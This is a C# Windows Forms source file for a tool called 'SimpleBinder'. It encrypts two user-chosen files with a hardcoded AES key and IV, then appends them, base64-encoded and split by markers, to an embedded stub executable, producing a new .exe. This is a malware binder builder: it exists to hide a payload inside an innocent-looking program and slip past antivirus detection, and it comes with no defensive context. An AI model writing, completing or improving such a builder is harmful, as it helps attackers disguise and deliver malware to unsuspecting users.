﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SimpleBinder
{
    public partial class BinerLolza : Form
    {
        string F;
        string F2;
        public BinerLolza()
        {
            InitializeComponent();
        }

        private void BinerLolza_Load(object sender, EventArgs e)
        {
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int one = rnd.Next(0, 255);
            int two = rnd.Next(0, 255);
            int three = rnd.Next(0, 255);
            int four = rnd.Next(0, 255);
            build.ForeColor = Color.FromArgb(one, two, three, four);
            build.BackColor = Color.FromArgb(one, two, three, four);
            t1.ForeColor = Color.FromArgb(one, two, three, four);
            t2.ForeColor = Color.FromArgb(one, two, three, four);
            button1.BackColor = Color.FromArgb(one, two, three, four);
            button2.BackColor = Color.FromArgb(one, two, three, four);
            button1.ForeColor = Color.FromArgb(one, two, three, four);
            button2.ForeColor = Color.FromArgb(one, two, three, four);
            label1.ForeColor = Color.FromArgb(one, two, three, four);
            label2.ForeColor = Color.FromArgb(one, two, three, four);
            label3.ForeColor = Color.FromArgb(one, two, three, four);
            button3.ForeColor = Color.FromArgb(one, two, three, four);
            button3.BackColor = Color.FromArgb(one, two, three, four);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            var _with1 = ofd;
            _with1.FileName = "";
            _with1.Title = "Choose a file";
            _with1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            _with1.Filter = "Any File |*.*";
            if (_with1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                F = _with1.SafeFileName;
                t1.Text = _with1.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            var _with2 = ofd;
            _with2.FileName = "";
            _with2.Title = "Choose a file";
            _with2.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            _with2.Filter = "Any File |*.*";
            if (_with2.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                F2 = _with2.SafeFileName;
                t2.Text = _with2.FileName;
            }
        }

        public byte[] Secure(byte[] Data)
        {
            using (RijndaelManaged SA = new RijndaelManaged())
            {
                SA.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7 };
                SA.Key = new byte[] { 7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1 };

                return SA.CreateEncryptor().TransformFinalBlock(Data, 0, Data.Length);
            }
        }

        public byte[] UnSecure(byte[] Data)
        {
            using (RijndaelManaged SA = new RijndaelManaged())
            {
                SA.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7 };
                SA.Key = new byte[] { 7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1 };
                return SA.CreateDecryptor().TransformFinalBlock(Data, 0, Data.Length);
            }
        }

        private void build_Click(object sender, EventArgs e)
        {
            try
            {
                SaveFileDialog sfd = new SaveFileDialog();
                var _with1 = sfd;
                _with1.FileName = "";
                _with1.Title = "Save File";
                _with1.Filter = "Application |*.exe";
                _with1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (_with1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    string sp = "[SPLITTER]";

                    byte[] buffer = Properties.Resources.CStub;

                    File.WriteAllBytes(_with1.FileName, buffer);
                    byte[] file1 = Secure(File.ReadAllBytes(t1.Text));
                    byte[] file2 = Secure(File.ReadAllBytes(t2.Text));
                    File.AppendAllText(_with1.FileName, sp + Convert.ToBase64String(file1) + sp + F + sp + Convert.ToBase64String(file2) + sp + F2);
                    MessageBox.Show("Success");
                }
            }
            catch (Exception Ex)
            {
                MessageBox.Show(Ex.Message);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            timer1.Stop();
        }
    }
}
